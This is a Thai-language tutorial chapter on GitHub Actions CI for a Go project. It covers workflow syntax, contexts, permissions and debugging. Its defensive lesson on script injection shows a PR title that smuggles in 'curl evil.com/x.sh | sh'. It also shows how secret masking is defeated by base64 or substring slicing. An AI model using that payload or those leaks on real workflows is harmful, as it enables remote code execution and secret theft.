# 06 — GitHub Actions (CI)

## CI คืออะไร

**Continuous Integration** = ทุกครั้งที่โค้ดเข้ามา ให้เครื่องตรวจให้อัตโนมัติว่า "ยังใช้ได้อยู่ไหม"
เป้าหมายคือรู้ว่าพังภายในไม่กี่นาที ไม่ใช่ไปรู้ตอน deploy

ไฟล์: `.github/workflows/ci.yml`

## ศัพท์ที่ต้องรู้

```
Workflow (ci.yml)
└── Job (build-and-test)         ← รันบน runner คนละเครื่อง, ขนานกันได้
    └── Step                      ← คำสั่งทีละอย่าง
        ├── uses: <action>         ← เรียกใช้ action ที่คนอื่นเขียนไว้
        └── run: <shell>           ← รันคำสั่ง shell
```

## Trigger

```yaml
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
```

รันเมื่อ push เข้า main และเมื่อเปิด/อัปเดต PR ที่จะ merge เข้า main

```yaml
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true
```

push ติด ๆ กัน → ยกเลิกรอบเก่าทิ้ง เอาแต่รอบล่าสุด (ประหยัดเวลา + โควตา)

## Service container — DB จริงในไฟล์ CI

```yaml
services:
  postgres:
    image: postgres:16-alpine
    env:
      {
        POSTGRES_USER: app,
        POSTGRES_PASSWORD: app_password,
        POSTGRES_DB: tododb,
      }
    ports: ["5432:5432"]
    options: >-
      --health-cmd "pg_isready -U app -d tododb"
      --health-interval 5s
      --health-retries 10
```

GitHub ปั้น Postgres จริงขึ้นมาให้ระหว่างรัน job แล้วดับให้เอง — ไม่ต้อง mock
`--health-*` ทำให้ GitHub รอจน DB พร้อมก่อนเริ่ม step แรก

ใน job นี้เข้าถึงด้วย `localhost:5432` (ไม่ใช่ชื่อ service เพราะ step รันบน host ของ runner ไม่ได้อยู่ใน container)

## Steps ทีละอัน

```yaml
- uses: actions/checkout@v4 # ดึงโค้ดลงมา — ขาดไม่ได้

- uses: actions/setup-go@v5
  with:
    go-version: "1.25" # cache module ของ Go ให้อัตโนมัติ ไม่ต้องตั้ง cache: เพิ่มเหมือน npm

- run: go build -o api ./cmd/api # คอมไพล์จริง — ผ่านแปลว่า type ถูกทั้งหมดแล้ว
- run: go vet ./... # ตรวจเพิ่มเติมที่ compiler ไม่ฟ้อง (เช่น format string ผิด, lock ที่ copy โดยไม่ตั้งใจ)
- name: Install golang-migrate
  run: go install -tags 'postgres' github.com/golang-migrate/migrate/v4/cmd/migrate@v4.18.1
- run: migrate -path migrations -database "$DATABASE_URL" up # ทดสอบว่า migration รันผ่านจริง
```

`actions/setup-go@v5` มี module caching ในตัวอยู่แล้ว (key ตาม hash ของ `go.sum`) — ไม่ต้องตั้ง `cache:` แยกแบบที่ `setup-node` เคยต้องทำ

**ทำไมไม่มี step แยกสำหรับ typecheck แบบ `tsc --noEmit` เดิม:** TypeScript เป็นภาษาที่ compile แล้วยังรันเป็น JS ต่อได้แม้ type ผิด (`tsc` แค่เตือน ไม่ได้บล็อกการรัน) เลยต้องมี step ตรวจ type แยกต่างหาก
Go ตรงข้ามกัน — **`go build` คอมไพล์ไม่ผ่านถ้า type ผิด** สร้าง binary ไม่ได้เลย type-check จึงติดมากับ build ฟรี ไม่ต้องมี step แยก
`go vet ./...` เป็นชั้นเสริมที่ตรวจสิ่งที่ compile ผ่านได้แต่มีกลิ่นบั๊ก (เช่น `Printf` ที่ argument ไม่ตรง verb)

**pin เวอร์ชันของ action เสมอ** (`@v4`/`@v5` ไม่ใช่ `@main`) เพื่อไม่ให้ pipeline พังเองวันดีคืนดี

## Smoke test

step สุดท้ายสตาร์ท server จริงแล้วยิง endpoint:

```bash
./api &
for i in $(seq 1 20); do curl -fsS localhost:3000/healthz && break; sleep 1; done
curl -fsS localhost:3000/readyz
curl -fsS -X POST localhost:3000/api/todos -H 'Content-Type: application/json' -d '{"title":"from ci"}'
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST localhost:3000/api/todos -H 'Content-Type: application/json' -d '{}')
test "$code" = "400" || exit 1
```

- `./api &` รัน binary ที่ build ไว้ตรง ๆ ในพื้นหลัง (ไม่ต้องมี runtime แยกแบบ `node dist/index.js`)
- `curl -f` ทำให้ exit code ไม่เป็น 0 เมื่อได้ 4xx/5xx → step ล้มเหลวเอง
- loop รอ server พร้อม ดีกว่า `sleep 10` แบบสุ่ม
- เช็ค 400 ด้วย เพราะ "path ที่ควรพัง ต้องพังให้ถูกวิธี" ก็เป็นพฤติกรรมที่ต้องทดสอบ

> smoke test นี้ตั้งใจให้เข้าใจง่าย ของจริงควรอัปเกรดเป็น table-driven test ของ Go เอง (ดู [แบบฝึกหัด CI/CD](../exercises/cicd/01-beginner.md))

## Job ที่สอง: build image ตอนเปิด PR

```yaml
docker-build:
  needs: build-and-test # รอ job แรกผ่านก่อน
  if: github.event_name == 'pull_request'
  steps:
    - uses: docker/setup-buildx-action@v3
    - uses: docker/build-push-action@v6
      with:
        push: false # PR แค่ตรวจว่า build ผ่าน ไม่ push
        cache-from: type=gha
        cache-to: type=gha,mode=max
```

- `needs:` = ลำดับการทำงาน (ไม่ใส่ = รันขนานกัน)
- `type=gha` = ใช้ cache ของ GitHub Actions เก็บ docker layer ข้ามรอบ build → เร็วขึ้นมาก

## ทำให้ CI มีความหมายจริง ๆ

CI ที่ merge ผ่านได้ทั้งที่แดง = ไม่มีประโยชน์ ไปตั้งที่
**Settings → Branches → Add branch protection rule** สำหรับ `main`:

- ✅ Require a pull request before merging
- ✅ Require status checks to pass → เลือก `build-and-test`
- ✅ Require branches to be up to date before merging

## ดีบักเวลา CI แดง

1. อ่าน log ที่แท็บ Actions ดูว่า step ไหนแดง
2. รันคำสั่งเดียวกันในเครื่องตัวเอง — ส่วนใหญ่พังเพราะ env ต่างกัน
3. ใส่ `- run: env | sort` ชั่วคราวเพื่อดูตัวแปร (ระวังอย่าพิมพ์ secret ออกมา — GitHub ปิดให้เป็น `***` อยู่แล้วแต่ไม่ควรเสี่ยง)
4. อยากรันในเครื่อง: ลองเครื่องมือ [act](https://github.com/nektos/act)

---

# ภาคลึก — อ่าน workflow ให้ออกทุกบรรทัด

ส่วนนี้คือความรู้ที่ต้องมีก่อนไปอ่าน `deploy-k8s.yml` และ `build-push.yml` ใน [10](10-deploy-free-cloud.md)
ถ้าข้ามส่วนนี้ไป จะอ่าน workflow ได้แค่ "เดาว่าน่าจะทำอะไร" ไม่ใช่ "รู้ว่ามันทำอะไร"

## L1. `${{ }}` ถูกประเมินเมื่อไร — คำถามที่สำคัญที่สุด

**ก่อนที่ shell จะได้เห็นบรรทัดนั้นเลย**

```yaml
- run: echo "สวัสดี ${{ github.actor }}"
```

GitHub จะ **แทนค่าเป็นข้อความก่อน** แล้วค่อยเขียนลงไฟล์สคริปต์ชั่วคราว แล้วค่อยเรียก bash:

```bash
# ไฟล์ที่ถูกสร้างจริง
echo "สวัสดี johndoe"
```

**ผลที่ตามมาที่ต้องเข้าใจ:** ถ้าค่านั้นมีอักขระพิเศษของ shell มันจะกลายเป็น**คำสั่ง** ไม่ใช่ข้อความ

```yaml
# ❌ ช่องโหว่ script injection
- run: echo "หัวข้อ PR: ${{ github.event.pull_request.title }}"
```

ถ้ามีคนตั้งชื่อ PR ว่า `"; curl evil.com/x.sh | sh; #` ไฟล์ที่ถูกสร้างจะกลายเป็น:

```bash
echo "หัวข้อ PR: "; curl evil.com/x.sh | sh; #"
```

**วิธีแก้ที่ถูกต้อง — ส่งผ่าน env เสมอ:**

```yaml
# ✅ ปลอดภัย
- run: echo "หัวข้อ PR: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

เพราะ env ถูกส่งเป็น**ตัวแปรของ process** ไม่ได้ถูกแทนลงในตัวสคริปต์

**กฎที่ควรยึด:** ค่าที่มาจากคนภายนอก (ชื่อ PR, ชื่อ branch, comment, ชื่อ issue) **ห้ามใส่ตรง ๆ ใน `run:`**
ส่วนค่าที่ GitHub สร้างเอง (`github.sha`, `github.repository`) ปลอดภัย เพราะรูปแบบถูกจำกัดอยู่แล้ว

---

## L2. Context — ตัวแปรมาจากไหนบ้าง

| Context | คือ | ใช้ได้ที่ |
| --- | --- | --- |
| `github` | ข้อมูลของ event (sha, ref, actor, repository, event_name, run_id) | ทุกที่ |
| `env` | ตัวแปรที่เราตั้งเอง | ทุกที่ยกเว้นบล็อก `env` ตัวเอง |
| `vars` | Repository/Environment **Variables** (ไม่ลับ) | ทุกที่ |
| `secrets` | Repository/Environment **Secrets** (ลับ) | `run`, `with`, `env` — **ใช้ใน `if:` ระดับ job ไม่ได้ในบางกรณี** |
| `job` | สถานะ job ปัจจุบัน (`job.status`) | ภายใน job |
| `steps` | ผลลัพธ์ของ step ก่อนหน้า (`steps.<id>.outputs.x`, `.outcome`, `.conclusion`) | หลัง step ที่มี `id` |
| `needs` | outputs ของ job ที่รอ (`needs.build.outputs.digest`) | job ที่มี `needs` |
| `inputs` | ค่าจาก `workflow_dispatch` หรือ `workflow_call` | ทุกที่ |
| `matrix` | ค่าปัจจุบันของ matrix | job ที่มี strategy |
| `runner` | `runner.os`, `runner.temp`, `runner.arch` | ภายใน job |

**ความต่างที่คนสับสนบ่อยที่สุด — `outcome` vs `conclusion`:**

```yaml
- id: deploy
  run: ./deploy.sh
  continue-on-error: true
- run: echo "${{ steps.deploy.outcome }} / ${{ steps.deploy.conclusion }}"
```

| | ความหมาย |
| --- | --- |
| `outcome` | ผลลัพธ์ **ก่อน** ใช้ `continue-on-error` — คือผลจริง ๆ |
| `conclusion` | ผลลัพธ์ **หลัง** ใช้ `continue-on-error` — เป็น `success` แม้จะพัง |

ใน `deploy-k8s.yml` เราใช้ `steps.rollout.outcome` เพราะต้องการรู้**ผลจริง** ไม่ใช่ผลที่ถูกกลบ

---

## L3. `if:` — กฎที่ต่างจากที่อื่น

```yaml
if: github.ref == 'refs/heads/main'          # ไม่ต้องใส่ ${{ }}
if: ${{ inputs.image-digest == '' }}          # ใส่ก็ได้ ผลเหมือนกัน
```

**สิ่งที่ต้องรู้ 4 ข้อ:**

**1. ทุก step/job มี `if: success()` ซ่อนอยู่โดยปริยาย** — พอมีอะไรพัง ตัวที่เหลือจะถูกข้าม

**2. status function ทั้ง 4 ตัว**

| ฟังก์ชัน | รันเมื่อ |
| --- | --- |
| `success()` | ทุกอย่างก่อนหน้าสำเร็จ (ค่าเริ่มต้น) |
| `failure()` | มีอะไรพัง |
| `always()` | **เสมอ** แม้ workflow ถูกยกเลิก |
| `cancelled()` | ถูกยกเลิกเท่านั้น |

**3. `always()` อันตรายกว่าที่คิด** — มันทำให้ step รันแม้ผู้ใช้กด Cancel
ถ้าต้องการแค่ "รันแม้ก่อนหน้าจะพัง" ให้ใช้ `if: !cancelled()` แทน จะปลอดภัยกว่า

**4. พอใส่ `if:` เอง ค่าปริยายจะหายไป** — ต้องเขียนเงื่อนไขให้ครบเอง

```yaml
# ❌ พัง — job จะรันแม้ build พัง
if: inputs.image-digest != ''

# ✅ ถูก — ระบุเงื่อนไขความสำเร็จเอง
if: always() && (needs.build.result == 'success' || inputs.image-digest != '')
```

บรรทัดหลังคือของจริงใน `deploy-k8s.yml` — เพราะเราต้องการให้ job `deploy` ทำงานได้ 2 กรณี:
build สำเร็จ **หรือ** ผู้ใช้ระบุ digest มาเอง (ซึ่ง build ถูก skip ไปเลย)

**`needs.<job>.result` มี 4 ค่า:** `success` / `failure` / `cancelled` / `skipped`
**job ที่ถูก skip ไม่นับว่า success** — จุดนี้ทำให้คนติดกันเยอะ

---

## L4. ส่งค่าระหว่าง step และ job

มี 4 ไฟล์พิเศษ เขียนด้วยการ `>>` ต่อท้าย

```bash
echo "key=value"   >> "$GITHUB_OUTPUT"        # ส่งให้ step อื่นในงานเดียวกัน
echo "KEY=value"   >> "$GITHUB_ENV"           # ตั้ง env ให้ step ถัดไป
echo "### หัวข้อ"  >> "$GITHUB_STEP_SUMMARY"  # แสดงบนหน้าเว็บของ run
echo "/opt/bin"    >> "$GITHUB_PATH"          # เพิ่มลงใน PATH
```

| | ใช้ได้ถึงไหน | ต้องมี `id` ไหม |
| --- | --- | --- |
| `GITHUB_OUTPUT` | step อื่นใน **job เดียวกัน** | ✅ ต้องมี |
| `GITHUB_ENV` | step ถัดไปใน job เดียวกัน | ❌ |
| `GITHUB_STEP_SUMMARY` | แสดงผลอย่างเดียว | ❌ |

**ข้ามไป job อื่นต้องประกาศ `outputs` ที่ระดับ job:**

```yaml
jobs:
  build:
    outputs:
      digest: ${{ steps.build.outputs.digest }}   # ← ยกจาก step ขึ้นมาระดับ job
  deploy:
    needs: build
    steps:
      - run: echo "${{ needs.build.outputs.digest }}"
```

**ทำไมต้องยกขึ้นมา:** แต่ละ job รันคนละเครื่อง ไฟล์ `$GITHUB_OUTPUT` ของ job หนึ่งอีก job ไม่เห็น
`outputs:` คือช่องทางเดียวที่ข้าม job ได้

**ค่าหลายบรรทัดต้องใช้ delimiter:**

```bash
{
  echo "notes<<EOF"
  cat CHANGELOG.md
  echo "EOF"
} >> "$GITHUB_OUTPUT"
```

⚠️ **outputs ของ job ถูกปิดบังถ้ามาจาก secret** และ **มีขนาดจำกัด 1 MB** ต่อ job

---

## L5. `run:` ทำงานบน shell แบบไหน

**ค่าเริ่มต้นบน Linux คือ `bash -e {0}`** — สังเกตว่ามีแค่ `-e` ไม่มี `-u` และ **ไม่มี `-o pipefail`**

ผลที่ตามมา:

```yaml
- run: |
    curl -s http://localhost/api | grep "ok"    # ← ถ้า curl พังแต่ grep เจอ จะยังผ่าน!
    echo "$UNDEFINED_VAR"                        # ← ไม่ error แค่ได้ค่าว่าง
```

**ทางแก้ — เขียนเองในบรรทัดแรกเสมอสำหรับสคริปต์ที่สำคัญ:**

```yaml
- run: |
    set -euo pipefail
    ...
```

| flag | ทำอะไร |
| --- | --- |
| `-e` | เจอคำสั่งที่ exit ไม่เป็น 0 → หยุดทันที |
| `-u` | ใช้ตัวแปรที่ไม่ได้ตั้ง → error (จับ typo ได้ดีมาก) |
| `-o pipefail` | ใน pipeline ถ้าตัวไหนพัง ถือว่าทั้งบรรทัดพัง |

**ข้อยกเว้นที่ `-e` ไม่ทำงาน** (ต้องรู้ ไม่งั้นจะงง):

```bash
if grep -q x file; then ... fi     # อยู่ใน if → ไม่หยุด (ถูกต้องแล้ว)
cmd || true                         # มี || → ไม่หยุด
code=$(curl ... || echo 000)        # อยู่ใน $() ที่มี || → ไม่หยุด
```

บรรทัดที่สามคือแพตเทิร์นที่เราใช้ใน `verify` — จงใจให้ไม่หยุด เพื่อจะได้ retry ต่อ

**เปลี่ยน shell ได้:**

```yaml
- run: ...
  shell: bash -euo pipefail {0}     # ตั้งทั้ง step
defaults:
  run:
    shell: bash -euo pipefail {0}   # ตั้งทั้ง workflow
```

---

## L6. Secret ถูกปิดบังยังไง และเมื่อไรมันพัง

GitHub เก็บรายการค่าของ secret ไว้ แล้วค้นหาข้อความนั้นใน log แล้วแทนด้วย `***`

**แต่มันปิดบังได้เฉพาะค่าที่ "ตรงเป๊ะ" เท่านั้น**

```bash
echo "${{ secrets.TOKEN }}"              # ***          ปลอดภัย
echo "${{ secrets.TOKEN }}" | base64     # ไม่ถูกปิดบัง!  ค่าเปลี่ยนรูปแล้ว
echo "${TOKEN:0:10}"                     # ไม่ถูกปิดบัง!  ตัดบางส่วน
echo "$TOKEN" | jq -r .key               # ไม่ถูกปิดบัง!  แยกส่วนออกมา
```

**บทเรียน:** อย่าคิดว่าการปิดบังคือระบบความปลอดภัย มันเป็นแค่ตาข่ายกันพลาด
ในทางปฏิบัติคือ **อย่า echo secret เลย** ไม่ว่ากรณีไหน

ถ้าต้องปิดบังค่าที่คำนวณเองระหว่างทาง:

```bash
echo "::add-mask::$COMPUTED_VALUE"
```

---

## L7. Reusable workflow ทำงานยังไง

ในโปรเจกต์นี้ `build-push.yml` เป็น reusable workflow — เรียกด้วย `uses:` ที่ระดับ **job** ไม่ใช่ step

```yaml
jobs:
  build:
    uses: ./.github/workflows/build-push.yml
    with:
      tag-prefix: main
      platforms: linux/amd64,linux/arm64
    secrets: inherit
```

**ข้อจำกัดที่ต้องรู้:**

| ข้อ | รายละเอียด |
| --- | --- |
| ใส่ `steps` ในตัวที่เรียกไม่ได้ | job ที่มี `uses` จะมีแค่ `with`/`secrets`/`needs`/`if` |
| ส่งค่ากลับต้องผ่าน `outputs` ของ workflow | ต้องประกาศ 2 ชั้น: step → job → workflow |
| `secrets: inherit` ส่งทุก secret ให้ | ถ้าอยากคุมให้ระบุทีละตัวแทน |
| ซ้อนได้ลึกสุด 4 ชั้น | |
| `env` ระดับ workflow ของผู้เรียก **ไม่ถูกส่งต่อ** | ต้องส่งผ่าน `with:` |

**การส่ง output กลับ 2 ชั้น** — นี่คือส่วนที่คนงงที่สุด:

```yaml
# ใน build-push.yml
on:
  workflow_call:
    outputs:
      digest:
        value: ${{ jobs.build.outputs.digest }}   # ชั้น 2: job → workflow
jobs:
  build:
    outputs:
      digest: ${{ steps.build.outputs.digest }}   # ชั้น 1: step → job
```

---

## L8. `permissions` — โมเดลที่ต้องเข้าใจ

`GITHUB_TOKEN` ถูกสร้างใหม่ทุก run และหมดอายุเมื่อ run จบ สิทธิ์ของมันควบคุมด้วย `permissions:`

```yaml
permissions:          # ระดับ workflow — ใช้กับทุก job
  contents: read

jobs:
  build:
    permissions:      # ระดับ job — เขียนทับของ workflow ทั้งชุด
      contents: read
      packages: write
```

⚠️ **`permissions` ระดับ job ไม่ใช่การ "เพิ่ม" แต่เป็นการ "แทนที่ทั้งชุด"**
ถ้าเขียนแค่ `packages: write` ที่ระดับ job → `contents` จะกลายเป็น `none` และ `actions/checkout` จะพัง

ในโปรเจกต์นี้:

| workflow | permissions | เหตุผล |
| --- | --- | --- |
| `ci.yml` | `contents: read` | รันบ่อยที่สุด → ให้สิทธิ์น้อยที่สุด |
| `build-push.yml` | `contents: read`, `packages: write` | ต้อง push image |
| `deploy-*.yml` | เท่ากับข้างบน | ตัว deploy ใช้ secret คนละชุด ไม่ใช่ GITHUB_TOKEN |

---

## L9. `concurrency` — เมื่อไรควรยกเลิก เมื่อไรห้าม

```yaml
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true
```

`group` คือ "คิว" — run ที่อยู่ group เดียวกันจะไม่ทำงานพร้อมกัน

| งาน | `cancel-in-progress` | เหตุผล |
| --- | --- | --- |
| test / lint / build | `true` | อ่านอย่างเดียว ยกเลิกได้ ไม่ทิ้งอะไรค้าง |
| **deploy** | **`false`** | ยกเลิกกลางทาง = คลัสเตอร์ค้างในสถานะครึ่ง ๆ กลาง ๆ |

สังเกตว่า `deploy-k8s.yml` ใช้ `group: deploy-k8s` **โดยไม่มี `${{ github.ref }}`**
จงใจ — เพื่อให้ deploy จากทุก ref เข้าคิวเดียวกัน จะได้ไม่มีสอง deploy ยิงเข้าคลัสเตอร์พร้อมกัน

---

## L10. เครื่องมือ debug

```yaml
- run: echo '${{ toJSON(github) }}'      # ดู context ทั้งก้อน
- run: echo '${{ toJSON(needs) }}'       # ดูว่า job ก่อนหน้าส่งอะไรมา
- run: env | sort                        # ดู env ทั้งหมด (ระวัง secret)
```

เปิด debug log แบบละเอียด: ตั้ง repository secret `ACTIONS_STEP_DEBUG` = `true`

จัดกลุ่ม log ให้อ่านง่าย:

```bash
echo "::group::ชื่อกลุ่ม"
...
echo "::endgroup::"
```

สั่ง annotation ให้ขึ้นบนหน้า run:

```bash
echo "::error::ข้อความ error"
echo "::warning file=internal/app/app.go,line=10::ข้อความเตือน"
echo "::notice::ข้อความทั่วไป"
```

`::error::` ทำให้ข้อความเด่นขึ้นมาบนสุดของหน้า run — ใน `deploy-k8s.yml` เราใช้ตอน rollback เพื่อให้คนเห็นทันทีว่าเกิดอะไร

---

## 🪛 Playground

ลองเล่นก่อนไปบทถัดไป:

- [ ] แก้ `internal/todos/handler.go` ให้มี syntax error ตั้งใจ push/เปิด PR แล้วดูว่า step ไหนของ `quality` job แดง — `go build` จับได้ไหม
- [ ] ลบ step `go vet ./...` ออกชั่วคราว แล้วใส่โค้ดที่ `go vet` เคยจับได้ (เช่น `fmt.Printf("%d", "text")`) ดูว่า CI เขียวทั้งที่โค้ดมีกลิ่นบั๊ก
- [ ] เปลี่ยน `test "$code" = "400"` เป็น `"200"` ในสคริปต์ smoke test แล้วดูว่า step ล้มเหลวพร้อมข้อความอะไร
- [ ] เอา cache ของ `actions/setup-go@v5` ออกไม่ได้ตรง ๆ แต่ลองเทียบเวลา 2 run ติดกัน (run แรก vs run ที่สอง) ว่าต่างกันแค่ไหน
- [ ] เปิด `ACTIONS_STEP_DEBUG=true` แล้วดู log ละเอียดของ step `Install golang-migrate`

---

➡️ ต่อไป: [07 — CD + GHCR](07-cd-ghcr.md)
📖 อ่านสคริปต์จริงทีละบรรทัด: [13 — อ่านสคริปต์ deploy](13-reading-scripts.md)
